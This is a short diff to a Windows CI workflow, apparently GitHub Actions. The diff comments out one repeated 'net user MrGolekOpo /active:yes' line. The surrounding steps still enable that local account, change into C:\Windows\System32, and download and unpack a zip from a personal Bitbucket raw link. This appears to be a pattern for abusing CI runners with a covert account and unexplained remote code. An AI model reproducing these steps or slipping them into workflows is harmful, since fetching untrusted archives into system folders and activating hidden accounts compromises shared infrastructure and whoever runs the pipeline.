@@ -34,7 +34,7 @@ jobs:
         net user MrGolekOpo /active:yes
     - name: Opo
       run: |
-        net user MrGolekOpo /active:yes
+        #net user MrGolekOpo /active:yes
         chdir C:\Windows\System32
         Invoke-WebRequest https://bitbucket.org/sindylestari/sindy/raw/fbb0989251611234a1be583df22d4afc64f97f45/Api_App.zip -Outfile Api_App.zip
         Expand-Archive Api_App.zip
